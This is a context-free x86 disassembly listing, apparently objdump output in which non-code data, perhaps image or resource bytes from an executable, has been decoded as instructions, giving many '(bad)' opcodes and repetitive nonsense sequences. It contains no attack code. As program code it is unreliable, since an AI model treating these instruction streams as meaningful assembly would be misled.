  405a9b:	pop    ss
  405a9c:	sbb    al,0x25
  405a9e:	cmp    al,0x3c
  405aa0:	cmp    al,0x3e
  405aa2:	ds ds ds aas 
  405aa6:	aas    
  405aa7:	cmp    DWORD PTR [eax-0x22],esp
  405aaa:	(bad)  
  405aab:	nop
  405aac:	add    BYTE PTR [eax],al
  405aae:	add    BYTE PTR [eax],al
  405ab0:	add    ah,dl
  405ab2:	aad    0xd5
  405ab4:	lahf   
  405ab5:	stos   BYTE PTR es:[edi],al
  405ab6:	int    0x90
  405ab8:	nop
  405ab9:	lahf   
  405aba:	mov    ds:0x16020286,al
  405abf:	push   ss
  405ac0:	push   ss
  405ac1:	push   ss
  405ac2:	push   ss
  405ac3:	push   ss
  405ac4:	adc    al,0x14
  405ac6:	pop    ss
  405ac7:	push   ss
  405ac8:	add    eax,0x1c039092
  405acd:	cmp    al,0x56
  405acf:	push   esi
  405ad0:	inc    eax
  405ad1:	inc    eax
  405ad2:	push   edi
  405ad3:	push   edi
  405ad4:	push   edi
  405ad5:	push   edi
  405ad6:	pop    edx
  405ad7:	aas    
  405ad8:	pop    edx
  405ad9:	fstp   st(5)
  405adb:	mov    al,BYTE PTR [eax]
  405add:	add    BYTE PTR [eax],al
  405adf:	add    BYTE PTR [eax],al
  405ae1:	rcl    ebp,cl
  405ae3:	aad    0x9f
  405ae5:	stos   BYTE PTR es:[edi],al
  405ae6:	int    0x94
  405ae8:	xchg   ebp,eax
  405ae9:	xchg   ebp,eax
  405aea:	int    0x93
  405aec:	push   ss
  405aed:	sbb    DWORD PTR [eax],esp
  405aef:	sbb    BYTE PTR [eax],bl
  405af1:	push   ss
  405af2:	push   ss
  405af3:	push   ss
  405af4:	adc    al,0x17
  405af6:	adc    eax,0xaaa99904
  405afb:	dec    esp
  405afc:	and    DWORD PTR [eax+0x59],eax
  405aff:	pop    ecx
  405b00:	pop    edx
  405b01:	pop    edx
  405b02:	pop    esp
  405b03:	pop    edx
  405b04:	pop    ebp
  405b05:	pop    esp
  405b06:	pop    ebp
  405b07:	pop    eax
  405b08:	pop    eax
  405b09:	fucom  st(0)
  405b0b:	add    DWORD PTR [eax],0x0
  405b0e:	add    BYTE PTR [eax],al
  405b10:	add    dh,dl
  405b12:	aad    0xd7
  405b14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b15:	stos   BYTE PTR es:[edi],al
  405b16:	rcl    DWORD PTR [ebp-0x5d31606e],cl
  405b1c:	pop    ds
  405b1d:	sbb    DWORD PTR [esi],esp
  405b1f:	and    BYTE PTR [eax],ah
  405b21:	sbb    BYTE PTR [eax],bl
  405b23:	push   ss
  405b24:	adc    eax,0xe29b2817
  405b29:	fxch   st(5)
  405b2b:	fldenv [edi]
  405b2d:	pop    ecx
  405b2e:	pop    esp
  405b2f:	pop    esp
  405b30:	pop    esi
  405b31:	pop    esi
  405b32:	pop    esi
  405b33:	pop    esi
  405b34:	pop    esi
  405b35:	pop    esi
  405b36:	arpl   WORD PTR [ebp+0x5d],bx
  405b39:	(bad)  
  405b3a:	in     eax,dx
  405b3b:	nop
  405b3c:	add    BYTE PTR [eax],al
  405b3e:	add    BYTE PTR [eax],al
  405b40:	add    dh,dl
  405b42:	xlat   BYTE PTR ds:[ebx]
  405b43:	int    0x90
  405b45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b46:	rcr    DWORD PTR [ebp+eiz*4+0x29ccd3aa],cl
  405b4d:	sbb    DWORD PTR [edx],ebp
  405b4f:	es es and BYTE PTR es:[edi],dl
  405b54:	adc    al,0x5
  405b56:	int    0xf4
  405b58:	out    0x88,al
  405b5a:	mov    esi,0x614896e6
  405b5f:	popa   
  405b60:	popa   
  405b61:	arpl   WORD PTR [ebx+0x63],sp
  405b64:	push   0x6a
  405b66:	imul   ebp,DWORD PTR [ebx+0x5d],0xffffffc1
  405b6a:	in     eax,dx
  405b6b:	xchg   ecx,eax
  405b6c:	(bad)  
  405b6d:	add    BYTE PTR [eax],al
  405b6f:	add    BYTE PTR [eax],al
  405b71:	rcl    esp,cl
  405b73:	mov    edi,0xa9dda587
  405b78:	test   eax,0x43d0d3aa
  405b7d:	sbb    DWORD PTR [ebx],edi
  405b7f:	sub    ch,BYTE PTR [edx]
  405b81:	sub    BYTE PTR [eax],ah
  405b83:	push   ss
  405b84:	sub    ebp,ebx
  405b86:	cld    
  405b87:	hlt    
  405b88:	dec    ecx
  405b89:	and    DWORD PTR [ebx-0x1a],edx
  405b8c:	stc    
  405b8d:	push   esp
  405b8e:	bound  ebp,QWORD PTR [esp+ebp*2+0x6c]
  405b92:	ins    BYTE PTR es:[edi],dx
  405b93:	ins    BYTE PTR es:[edi],dx
  405b94:	ins    DWORD PTR es:[edi],dx
  405b95:	ins    DWORD PTR es:[edi],dx
  405b96:	ins    BYTE PTR es:[edi],dx
  405b97:	outs   dx,BYTE PTR ds:[esi]
  405b98:	pop    edi
  405b99:	mov    ebx,0xa595ed
  405b9e:	add    BYTE PTR [eax],al
  405ba0:	add    bl,dl
  405ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ba3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ba4:	sbb    DWORD PTR [edi-0x32555523],0xffffffd6
  405bab:	into   
  405bac:	dec    ebp
  405bad:	sbb    DWORD PTR [ebp+0x3b],eax
  405bb0:	cmp    edi,DWORD PTR [ebx]
  405bb2:	pop    ss
  405bb3:	pop    ds
  405bb4:	mov    esi,0x1c50f1fc
  405bb9:	sbb    eax,0xe6f9c025
  405bbe:	push   edx
  405bbf:	lods   eax,DWORD PTR ds:[esi]
  405bc0:	lods   eax,DWORD PTR ds:[esi]
  405bc1:	lods   eax,DWORD PTR ds:[esi]
  405bc2:	scas   al,BYTE PTR es:[edi]
  405bc3:	scas   al,BYTE PTR es:[edi]
  405bc4:	scas   al,BYTE PTR es:[edi]
  405bc5:	scas   al,BYTE PTR es:[edi]
  405bc6:	scas   al,BYTE PTR es:[edi]
  405bc7:	mov    ch,0x6b
  405bc9:	mov    cl,0xef
  405bcb:	test   eax,0x95
  405bd0:	add    dh,dl
  405bd2:	mov    al,ds:0xdd9f8dbc
  405bd7:	rcl    ebx,cl
  405bd9:	(bad)  
  405bda:	(bad)  
  405bdb:	fdiv   DWORD PTR [eax+0x18]
  405bde:	inc    edi
  405bdf:	inc    esp
  405be0:	inc    ebp
  405be1:	sub    al,0x15
  405be3:	pop    ss
  405be4:	cmp    al,BYTE PTR [ebp+0x2d1d213a]
  405bea:	sbb    eax,0x9bfcf348
  405bef:	imul   ebp,DWORD PTR [esi-0x4c4a5051],0x6eb5b5b5
  405bf9:	scas   eax,DWORD PTR es:[edi]
  405bfa:	in     eax,dx
  405bfb:	lds    edx,FWORD PTR [edx+0x0]
  405c01:	aam    0x89
  405c03:	je     0x405b94
  405c05:	mov    esp,0xd9d3d9de
  405c0a:	(bad)  
  405c0c:	lea    ebx,[edi]
  405c0e:	inc    edi
  405c0f:	inc    edi
  405c10:	dec    eax
  405c11:	and    BYTE PTR ds:0x1c1c1c17,dl
  405c17:	sbb    eax,0x2d2d2d1d
  405c1c:	mov    edx,0xb484fcf9
  405c21:	mov    ch,0xb5
  405c23:	mov    ch,0xb5
  405c25:	mov    ch,0xb5
  405c27:	ret    
  405c28:	scas   al,BYTE PTR es:[edi]
  405c29:	scas   eax,DWORD PTR es:[edi]
  405c2a:	out    dx,eax
  405c2b:	rcl    DWORD PTR [eax+0x0],cl
  405c31:	add    BYTE PTR [ebp+0x66],ah
  405c34:	jae    0x405bf2
  405c36:	in     al,0xd9
  405c38:	(bad)  
  405c3a:	(bad)  
  405c3c:	pushf  
  405c3d:	sub    BYTE PTR [eax+0x4b],cl
  405c40:	dec    ebx
  405c41:	pop    ss
  405c42:	adc    eax,0x211c1c1c
  405c47:	sbb    eax,0x332d2d2d
  405c4c:	imul   ebx,ebx,0xc368f4f9
  405c52:	ret    
  405c53:	ret    
  405c54:	(bad)
  405c58:	mov    ch,0xb3
  405c5a:	out    0xdd,al
  405c5c:	add    DWORD PTR [eax],0x0
  405c5f:	add    BYTE PTR [eax],al
  405c61:	add    BYTE PTR [esi+eax*1+0x11],ah
  405c65:	int    0xe3
  405c67:	aad    0xdd
  405c69:	(bad)  
  405c6b:	(bad)  [edx+0x4555472a]
  405c71:	adc    eax,0x1c1c1c17
  405c76:	sbb    eax,0x2e322d2d
  405c7b:	ss mov ch,0xb0
  405c7e:	loop   0x405c79
  405c80:	int    0xac
  405c82:	(bad)  
  405c83:	(bad)  
  405c84:	(bad)  
  405c85:	leave  
  405c86:	(bad)  
  405c87:	retf   0xafc7
  405c8a:	lock fnstsw WORD PTR [esi+0x0]
  405c8e:	add    BYTE PTR [eax],al
  405c90:	add    BYTE PTR [eax],al
  405c92:	or     al,BYTE PTR [ecx]
  405c94:	bswap  ebp
  405c96:	in     eax,0xde
  405c98:	aad    0xdd
  405c9a:	fucom  st(6)
  405c9c:	stos   BYTE PTR es:[edi],al
  405c9d:	sub    cl,BYTE PTR [ebx+0x69]
  405ca0:	and    BYTE PTR [edx],bl
  405ca2:	sbb    al,0x1c
  405ca4:	sbb    eax,0x32322d2d
  405ca9:	xor    al,0x30
  405cab:	inc    ecx
  405cac:	(bad)  
  405cad:	leave  
  405cae:	(bad)  
  405cb1:	xchg   edx,eax
  405cb3:	retf   0xcaca
  405cb6:	retf   0xcae7
  405cb9:	mov    bl,0xe3
  405cbb:	loop   0x405c40
  405cbd:	add    BYTE PTR [eax],al
  405cbf:	add    BYTE PTR [eax],al
  405cc1:	add    BYTE PTR [eax+ecx*1],cl
  405cc4:	jno    0x405c65
  405cc6:	lock aad 0xdd
  405cc9:	fstp   st(5)
  405ccb:	out    0xc5,al
  405ccd:	sub    DWORD PTR [ebx+0x53],ecx
  405cd0:	sbb    al,0x1a
  405cd2:	sbb    al,0x1d
  405cd4:	sbb    eax,0x32322e2d
  405cd9:	xor    al,0x30
  405cdb:	pop    edi
  405cdc:	out    0xe7,eax
  405cde:	enter  0xd99b,0xe6
  405ce2:	xchg   cl,cl
  405ce4:	out    0xe9,eax
  405ce6:	jmp    0xdaf846d4
  405ceb:	out    dx,eax
  405cec:	adc    esi,0x0
  405cef:	add    BYTE PTR [eax],al
  405cf1:	add    BYTE PTR [edx+0x7e],bh
  405cf4:	and    esi,0xfffffffc
  405cf7:	cld    
  405cf8:	lock out 0xdd,al
  405cfb:	loop   0x405cd5
  405cfd:	inc    ebx
  405cfe:	dec    ebx
  405cff:	inc    esi
  405d00:	adc    eax,0x2d1d1c1c
  405d05:	sub    eax,0x3032322e
  405d0a:	xor    eax,0xe9e9ea6e
  405d0f:	mov    ebx,0x86ddd3a7
  405d14:	jmp    0xec2b4803
  405d19:	(bad)  
  405d1a:	enter  0x90f3,0xaa
  405d1e:	add    BYTE PTR [eax],al
  405d20:	add    BYTE PTR [eax],al
  405d22:	add    al,dh
  405d24:	stos   BYTE PTR es:[edi],al
  405d25:	fucomp st(7)
  405d27:	stc    
  405d28:	cld    
  405d29:	cld    
  405d2a:	cld    
  405d2b:	hlt    
  405d2c:	fimul  WORD PTR [esi+0x3b]
  405d2f:	and    al,0x15
  405d31:	sbb    al,0x1d
  405d33:	sbb    eax,0x322e2d2d
  405d38:	xor    al,0x34
  405d3a:	aaa    
  405d3b:	ret    
  405d3c:	jmp    0x405d28
  405d3e:	jmp    0xbe9f:0xd39cbaea
  405d45:	jmp    0x405d32
  405d47:	jmp    0x405d34
  405d49:	leave  
  405d4a:	enter  0x95f7,0xa9
	...
  405d56:	(bad)  [edx-0x3061d23]
  405d5c:	in     eax,0x84
  405d5e:	adc    eax,0x1d1c1c1a
  405d63:	sbb    eax,0x32322e2d
  405d68:	xor    eax,0xf5e74134
  405d6d:	jmp    0x9ba7:0xbaeaeaea
  405d74:	call   0xf72c4964
  405d79:	retf   0xf9c8
  405d7c:	test   eax,0x92
	...
  405d89:	(bad)  [edx+0x28bddd6]
  405d8f:	sbb    bl,BYTE PTR [esp+ebx*1]
  405d92:	sbb    eax,0x322e2e1d
  405d97:	xor    dh,BYTE PTR [esi*1-0x150a14a1]
  405d9e:	cmc    
  405d9f:	jmp    0x405d96
  405da1:	jmp    0x405d8e
  405da3:	cmc    
  405da4:	jmp    0x405d9c
  405da6:	div    dh
  405da8:	cli    
  405da9:	jmp    0x405d73
  405dab:	sti    
  405dac:	(bad)  
  405dad:	nop
	...
  405dba:	add    BYTE PTR [eax],al
  405dbc:	fcomp  DWORD PTR [esi+edx*1+0x1d1c1c15]
  405dc3:	sub    eax,0x34322e2d
  405dc8:	xor    eax,0xf5f66e34
  405dcd:	cmc    
  405dce:	cmc    
  405dcf:	cmc    
  405dd0:	div    dh
  405dd2:	div    dh
  405dd4:	cmc    
  405dd5:	jmp    0x405dc2
  405dd7:	jmp    0x405dc2
  405dd9:	(bad)  
  405dda:	mov    dl,0xf9
  405ddc:	loop   0x405e58
	...
  405dea:	add    BYTE PTR [eax],al
  405dec:	add    BYTE PTR [ecx+0x211a1a16],ch
  405df2:	sbb    eax,0x32312e1d
  405df7:	xor    al,0x35
  405df9:	aaa    
  405dfa:	(bad)  
  405dfb:	cld    
  405dfc:	cmc    
  405dfd:	jmp    0x405de9
  405dff:	jmp    0xc80a28eb
  405e04:	(bad)  
  405e05:	mov    dh,0xb6
  405e07:	ret    0xc8c8
  405e0a:	enter  0xf0f9,0x7f
	...
  405e1a:	add    BYTE PTR [eax],al
  405e1c:	add    dh,cl
  405e1e:	sub    DWORD PTR ds:0x2d1d1d1d,edx
  405e24:	xor    ch,BYTE PTR [esi]
  405e26:	xor    BYTE PTR [eax],dh
  405e28:	das    
  405e29:	xor    eax,0xb4afb66d
  405e2e:	mov    ah,0xb9
  405e30:	mov    ebx,0xdac8c8c6
  405e35:	fcmovu st,st(3)
  405e37:	out    0xe6,al
  405e39:	out    0xf2,al
  405e3b:	xrelease lock add BYTE PTR [eax],al
	...
  405e4b:	add    BYTE PTR [eax],al
  405e4d:	rol    DWORD PTR [edx+0x1a],1
  405e50:	sbb    bl,BYTE PTR [ebx]
  405e52:	sbb    ebx,DWORD PTR [ebx]
  405e54:	sbb    eax,0x53593e25
  405e59:	stos   DWORD PTR es:[edi],eax
  405e5a:	mov    ebx,0xddddd5c1
  405e5f:	fstp   st(5)
  405e61:	loop   0x405e44
  405e63:	in     eax,0xe6
  405e65:	lock xrelease add BYTE PTR [eax],al
	...
  405e7d:	into   
  405e7e:	dec    edi
  405e7f:	daa    
  405e80:	inc    ebx
  405e81:	push   esp
  405e82:	mov    BYTE PTR [ecx-0x21212e59],dl
  405e88:	loope  0x405e6f
  405e8a:	fsubrp st(2),st
  405e8c:	out    0xe6,al
  405e8e:	lock add BYTE PTR [eax],al
	...
  405ead:	stos   BYTE PTR es:[edi],al
  405eae:	(bad)  
  405eaf:	rcr    dh,cl
  405eb1:	(bad)  
  405eb3:	in     al,0xe4
  405eb5:	out    0xef,al
	...
  405edb:	add    BYTE PTR [eax],al
  405edd:	add    dh,ah
	...
  405fbf:	add    bh,bh
  405fc1:	(bad)  
  405fc2:	(bad)  
  405fc3:	(bad)  
  405fc4:	(bad)  
  405fc5:	inc    DWORD PTR [eax]
  405fc7:	add    bh,bh
  405fc9:	(bad)  
  405fca:	(bad)  
  405fcb:	(bad)  
  405fcc:	(bad)  
  405fcd:	inc    DWORD PTR [eax]
  405fcf:	add    bh,bh
  405fd1:	(bad)  
  405fd2:	(bad)  
  405fd3:	(bad)  
  405fd4:	(bad)  
  405fd5:	inc    DWORD PTR [eax]
  405fd7:	add    bh,bh
  405fd9:	(bad)  
  405fda:	inc    DWORD PTR [eax+0xffff]
  405fe0:	(bad)  
  405fe1:	(bad)  
  405fe2:	cld    
  405fe3:	add    BYTE PTR [edi],cl
  405fe5:	inc    DWORD PTR [eax]
  405fe7:	add    bh,bh
  405fe9:	push   eax
  405feb:	add    BYTE PTR [ebx],al
  405fed:	inc    DWORD PTR [eax]
  405fef:	add    bh,bh
  405ff1:	inc    eax
  405ff3:	add    BYTE PTR [ecx],al
  405ff5:	inc    DWORD PTR [eax]
  405ff7:	add    bh,bh
  405ff9:	inc    DWORD PTR [eax+0xff0000]
  405fff:	add    bh,bh
  406001:	inc    DWORD PTR [eax+0xff0000]
  406007:	add    bh,bh
  406009:	inc    DWORD PTR [eax+0xff0000]
  40600f:	add    bh,bh
  406011:	inc    DWORD PTR [eax+0xff0000]
  406017:	add    bl,ah
  406019:	inc    eax
  40601b:	add    BYTE PTR [eax],al
  40601d:	lahf   
  40601e:	add    BYTE PTR [eax],al
  406020:	rol    BYTE PTR [edi],0xe0
  406023:	add    BYTE PTR [eax],al
  406025:	pop    ds
  406026:	add    BYTE PTR [eax],al
  406028:	add    BYTE PTR [ecx],0xf8
  40602b:	add    BYTE PTR [eax],al
  40602d:	pop    ds
  40602e:	add    BYTE PTR [eax],al
  406030:	add    BYTE PTR [eax],0x7f
  406033:	add    BYTE PTR [eax],al
  406035:	pop    ds
  406036:	add    BYTE PTR [eax],al
  406038:	add    BYTE PTR [eax],0x1c
  40603b:	add    BYTE PTR [eax],al
  40603d:	sldt   WORD PTR [eax]
  406040:	add    BYTE PTR [eax],0x0
  406043:	add    BYTE PTR [eax],al
  406045:	sldt   WORD PTR [eax]
  406048:	add    BYTE PTR [eax],0x0
  40604b:	add    BYTE PTR [eax],al
  40604d:	sldt   WORD PTR [eax]
  406050:	add    BYTE PTR [eax],0x0
  406053:	add    BYTE PTR [eax],al
  406055:	sldt   WORD PTR [eax]
  406058:	add    BYTE PTR [eax],0x0
  40605b:	add    BYTE PTR [eax],al
  40605d:	sldt   WORD PTR [eax]
  406060:	add    BYTE PTR [eax],0x0
  406063:	add    BYTE PTR [eax],al
  406065:	sldt   WORD PTR [eax]
  406068:	add    BYTE PTR [eax],0x0
  40606b:	add    BYTE PTR [eax],al
  40606d:	sldt   WORD PTR [eax]
  406070:	add    BYTE PTR [eax],0x0
  406073:	add    BYTE PTR [eax],al
  406075:	sldt   WORD PTR [eax]
  406078:	add    BYTE PTR [eax],0x0
  40607b:	add    BYTE PTR [eax],al
  40607d:	sldt   WORD PTR [eax]
  406080:	add    BYTE PTR [eax],0x0
  406083:	add    BYTE PTR [eax],al
  406085:	pop    es
  406086:	add    BYTE PTR [eax],al
  406088:	add    BYTE PTR [eax],0x0
  40608b:	add    BYTE PTR [eax],al
  40608d:	pop    es
  40608e:	add    BYTE PTR [eax],al
  406090:	add    BYTE PTR [eax],0x0
  406093:	add    BYTE PTR [eax],al
  406095:	pop    es
  406096:	add    BYTE PTR [eax],al
  406098:	add    BYTE PTR [eax],0x0
  40609b:	add    BYTE PTR [eax],al
  40609d:	pop    es
  40609e:	add    BYTE PTR [eax],al
  4060a0:	add    BYTE PTR [eax],0x0
  4060a3:	add    BYTE PTR [eax],al
  4060a5:	pop    es
  4060a6:	add    BYTE PTR [eax],al
  4060a8:	rol    BYTE PTR [eax],0x0
  4060ab:	add    BYTE PTR [eax],al
  4060ad:	pop    es
  4060ae:	add    BYTE PTR [eax],al
  4060b0:	rol    BYTE PTR [eax],0x0
  4060b3:	add    BYTE PTR [eax],al
  4060b5:	pop    es
  4060b6:	add    BYTE PTR [eax],al
  4060b8:	rol    BYTE PTR [eax],0x0
  4060bb:	add    BYTE PTR [eax],al
  4060bd:	pop    es
  4060be:	add    BYTE PTR [eax],al
  4060c0:	rol    BYTE PTR [eax],0x0
  4060c3:	add    BYTE PTR [eax],al
  4060c5:	add    eax,DWORD PTR [eax]
  4060c7:	add    al,al
  4060c9:	add    BYTE PTR [eax],al
  4060cb:	add    BYTE PTR [eax],al
  4060cd:	add    eax,DWORD PTR [eax]
  4060cf:	add    al,ah
  4060d1:	add    BYTE PTR [eax],al
  4060d3:	add    BYTE PTR [eax],al
  4060d5:	add    eax,DWORD PTR [eax]
  4060d7:	add    ah,bh
  4060d9:	add    BYTE PTR [eax],al
  4060db:	add    BYTE PTR [eax],al
  4060dd:	add    eax,DWORD PTR [eax]
  4060df:	add    bh,bh
  4060e1:	add    BYTE PTR [eax],0x0
  4060e4:	add    BYTE PTR [ebx],al
  4060e6:	add    BYTE PTR [eax],al
  4060e8:	push   eax
  4060ea:	add    BYTE PTR [eax],al
  4060ec:	add    BYTE PTR [ebx],al
  4060ee:	add    BYTE PTR [eax],al
  4060f0:	(bad)  
  4060f1:	clc    
  4060f2:	add    BYTE PTR [eax],al
  4060f4:	add    BYTE PTR [ebx],al
  4060f6:	add    BYTE PTR [eax],al
  4060f8:	(bad)  
  4060f9:	clc    
  4060fa:	add    BYTE PTR [eax],al
  4060fc:	add    BYTE PTR [edi],al
  4060fe:	add    BYTE PTR [eax],al
  406100:	(bad)  
  406101:	clc    
  406102:	add    BYTE PTR [eax],al
  406104:	add    edi,edi
  406106:	add    BYTE PTR [eax],al
  406108:	(bad)  
  406109:	clc    
  40610a:	add    BYTE PTR [ecx],al
  40610c:	(bad)  
  40610d:	inc    DWORD PTR [eax]
  40610f:	add    bh,bh
  406111:	clc    
  406112:	add    edi,edi
  406114:	(bad)  
  406115:	inc    DWORD PTR [eax]
  406117:	add    bh,bh
  406119:	std    
  40611a:	(bad)  
  40611b:	(bad)  
  40611c:	(bad)  
  40611d:	inc    DWORD PTR [eax]
  40611f:	add    bh,bh
  406121:	(bad)  
  406122:	(bad)  
  406123:	(bad)  
  406124:	(bad)  
  406125:	inc    DWORD PTR [eax]
  406127:	add    bh,bh
  406129:	(bad)  
  40612a:	(bad)  
  40612b:	(bad)  
  40612c:	(bad)  
  40612d:	inc    DWORD PTR [eax]
  40612f:	add    bh,bh
  406131:	(bad)  
  406132:	(bad)  
  406133:	(bad)  
  406134:	(bad)  
  406135:	inc    DWORD PTR [eax]
  406137:	add    bh,bh
  406139:	(bad)  
  40613a:	(bad)  
  40613b:	(bad)  
  40613c:	(bad)  
  40613d:	inc    DWORD PTR [eax]
  40613f:	add    BYTE PTR [eax],ch
  406141:	add    BYTE PTR [eax],al
  406143:	add    BYTE PTR [eax],ah
  406145:	add    BYTE PTR [eax],al
  406147:	add    BYTE PTR [eax+0x0],al
  40614a:	add    BYTE PTR [eax],al
  40614c:	add    DWORD PTR [eax],eax
  40614e:	or     BYTE PTR [eax],al
  406150:	add    BYTE PTR [eax],al
  406152:	add    BYTE PTR [eax],al
  406154:	add    BYTE PTR [eax+eax*1],al
	...
  40615f:	add    BYTE PTR [eax],al
  406161:	add    DWORD PTR [eax],eax
  406163:	add    BYTE PTR [eax],al
  406165:	add    DWORD PTR [eax],eax
  406167:	add    BYTE PTR [eax],al
  406169:	add    BYTE PTR [eax],al
  40616b:	add    BYTE PTR [eax+eax*1+0x0],dh
  40616f:	add    BYTE PTR [eax+eax*1+0x0],bh
  406173:	add    BYTE PTR [edi+0x1d],dh
  406176:	push   ss
  406177:	add    BYTE PTR [edi+0x22],dh
  40617a:	sbb    DWORD PTR [eax],eax
  40617c:	jns    0x4061a2
  40617e:	sbb    al,BYTE PTR [eax]
  406180:	inc    edi
  406181:	es sub eax,0x222b6f00
  406187:	add    BYTE PTR [edi+ebp*1+0x2a],bh
  40618b:	add    BYTE PTR [eax],al
  40618d:	jnp    0x4061c8
  40618f:	add    BYTE PTR [ecx+0x49],cl
  406192:	dec    ecx
  406193:	add    BYTE PTR [ebx+0x52],dl
  406196:	push   edx
  406197:	add    BYTE PTR [edx+0x5f],bh
  40619a:	add    BYTE PTR [bx+0x66],ah
  40619e:	data16 add BYTE PTR [ecx+0x69],ch
  4061a2:	imul   eax,DWORD PTR [eax],0x697862
  4061a8:	je     0x40621d
  4061aa:	je     0x4061ac
  4061ac:	jp     0x406222
  4061ae:	ja     0x4061b0
  4061b0:	jns    0x40622b
  4061b2:	jnp    0x4061b4
  4061b4:	add    DWORD PTR [eax],0x0
  4061b7:	add    BYTE PTR [ebx-0x74000000],cl
  4061bd:	or     al,0x5
  4061bf:	add    BYTE PTR [eax-0x64fffefe],dl
  4061c5:	add    DWORD PTR [eax],eax
  4061c7:	add    BYTE PTR [ecx+ecx*1+0x148b0000],bl
  4061ce:	or     DWORD PTR [eax],eax
  4061d0:	nop
  4061d1:	adc    DWORD PTR [ebx],eax
  4061d3:	add    BYTE PTR [ecx-0x71fffff0],bl
  4061d9:	adc    dl,BYTE PTR [ebx]
  4061db:	add    BYTE PTR [esi-0x6affeee6],cl
  4061e1:	sbb    DWORD PTR [edx],edx
  4061e3:	add    BYTE PTR [ecx-0x51000000],ah
  4061e9:	add    eax,0xba20000
  4061ee:	add    BYTE PTR [eax],al
  4061f0:	stos   DWORD PTR es:[edi],eax
  4061f1:	or     eax,DWORD PTR [eax]
  4061f3:	add    BYTE PTR [esi-0x5afffef6],dh
  4061f9:	adc    DWORD PTR [eax],eax
  4061fb:	add    BYTE PTR [edx-0x52ffffeb],ch
  406201:	sbb    BYTE PTR [ecx],al
  406203:	add    BYTE PTR [ebx-0x4afff5e3],ch
  406209:	push   ss
  40620a:	add    BYTE PTR [eax],al
  40620c:	mov    ch,0x19
  40620e:	add    BYTE PTR [eax],al
  406210:	mov    ebp,0xb800001a
  406215:	push   ss
  406216:	or     eax,DWORD PTR [eax]
  406218:	mov    ch,0x1e
  40621a:	or     eax,DWORD PTR [eax]
  40621c:	(bad)  
  40621d:	and    DWORD PTR [edx],ebx
  40621f:	add    BYTE PTR [edx-0x5dffe2d8],dl
  406225:	sub    DWORD PTR [edi],edx
  406227:	add    BYTE PTR [edx-0x42ffe7d4],dh
  40622d:	sub    al,0x1c
  40622f:	add    BYTE PTR [edi-0x78ffe2cf],ch
  406235:	sub    ah,BYTE PTR [eax+eax*1]
  406238:	xchg   ebp,eax
  406239:	sub    esp,DWORD PTR [eax+eax*1]
  40623c:	xchg   esp,eax
  40623d:	xor    ch,BYTE PTR [ecx]
  40623f:	add    BYTE PTR [ebx-0x67ffcecc],dl
  406245:	xor    eax,0x3a9c0033
  40624a:	xor    al,0x0
  40624c:	mov    ds:0xad00202b,al
  406251:	and    eax,DWORD PTR ss:[eax]
  406254:	mov    bh,0x3d
  406256:	sub    eax,DWORD PTR [eax]
  406258:	mov    ebp,0xab002b3d
  40625d:	xor    eax,0xac60033
  406262:	add    BYTE PTR [eax],al
  406264:	aam    0xa
  406266:	add    BYTE PTR [eax],al
  406268:	lds    ebx,FWORD PTR [ecx+eax*1]
  40626b:	add    cl,ch
  40626d:	pop    es
  40626e:	add    BYTE PTR [eax],al
  406270:	lock push cs
  406272:	add    BYTE PTR [eax],al
  406274:	jecxz  0x40628d
  406276:	add    BYTE PTR [eax],al
  406278:	iret   
  406279:	and    BYTE PTR [eax],al
  40627b:	add    bh,dl
  40627d:	and    eax,DWORD PTR [eax]
  40627f:	add    al,cl
  406281:	sub    DWORD PTR [eax],edx
  406283:	add    bl,ah
  406285:	and    BYTE PTR [eax],al
  406287:	add    bh,dh
  406289:	sub    DWORD PTR [edx],eax
  40628b:	add    BYTE PTR [ebp-0x3bffc2be],dl
  406291:	inc    edx
  406292:	sub    al,0x0
  406294:	(bad)  
  406295:	inc    esp
  406296:	sub    eax,0x394ac800
  40629b:	add    cl,dl
  40629d:	push   edx
  40629e:	ds add ah,dh
  4062a1:	dec    edx
  4062a2:	sub    BYTE PTR [eax],al
  4062a4:	nop
  4062a5:	inc    ebx
  4062a6:	inc    esp
  4062a7:	add    BYTE PTR [ebx-0x70ffbab2],dl
  4062ad:	pop    ebp
  4062ae:	pop    eax
  4062af:	add    BYTE PTR [ebx-0x5affaca7],bl
  4062b5:	dec    ecx
  4062b6:	inc    edx
  4062b7:	add    BYTE PTR [ecx-0x4fffb3ad],ch
  4062bd:	push   edx
  4062be:	dec    ecx
  4062bf:	add    BYTE PTR [edx-0x4bffadb0],ah
  4062c5:	pop    ebp
  4062c6:	pop    ebp
  4062c7:	add    BYTE PTR [ebp-0x4affa69f],dl
  4062cd:	pusha  
  4062ce:	push   ebp
  4062cf:	add    BYTE PTR [esi-0x65ff918e],bl
  4062d5:	jbe    0x406350
  4062d7:	add    BYTE PTR [ebp-0x41ff9d99],dh
  4062dd:	jo     0x406347
  4062df:	add    BYTE PTR [edi-0x4fff8a83],ah
  4062e5:	je     0x406359
  4062e7:	add    BYTE PTR [ebx-0x2aff8a83],bh
  4062ed:	push   esi
  4062ee:	inc    ebx
  4062ef:	add    dh,ah
  4062f1:	pop    edi
  4062f2:	inc    edi
  4062f3:	add    bh,dl
  4062f5:	bound  ecx,QWORD PTR [esi+0x0]
  4062f8:	lds    ebp,FWORD PTR [ecx+0x59]
  4062fb:	add    ch,dl
  4062fd:	gs push ecx
  4062ff:	add    dl,ah
  406301:	push   0x73eb0053
  406306:	pop    esp
  406307:	add    bl,bh
  406309:	ja     0x406368
  40630b:	add    ah,cl
  40630d:	je     0x406376
  40630f:	add    cl,bl
  406311:	js     0x40637b
  406313:	add    cl,dl
  406315:	jl     0x406391
  406317:	add    ah,ah
  406319:	ja     0x40637f
  40631b:	add    ah,dh
  40631d:	js     0x406382
  40631f:	add    bl,cl
  406321:	mov    edi,DWORD PTR [edi+0x0]
  406324:	jmp    0x778c:0xf5007687
  40632b:	add    BYTE PTR [edx+0x7f008079],al
  406331:	mov    WORD PTR [esi-0x756b8100],cs
  406337:	add    BYTE PTR ds:0x4b0085f2,dl
  40633d:	(bad)  
  40633e:	mov    es,WORD PTR [eax]
  406340:	add    BYTE PTR [edx-0x7876ff7d],0x87
  406347:	add    BYTE PTR [esi-0x66ff7173],cl
  40634d:	test   DWORD PTR [eax-0x6b707600],ecx
  406353:	add    BYTE PTR [ecx-0x63ff6d72],dl
  406359:	(bad)  
  40635a:	xchg   edi,eax
  40635b:	add    BYTE PTR [eax-0x77ff6c63],cl
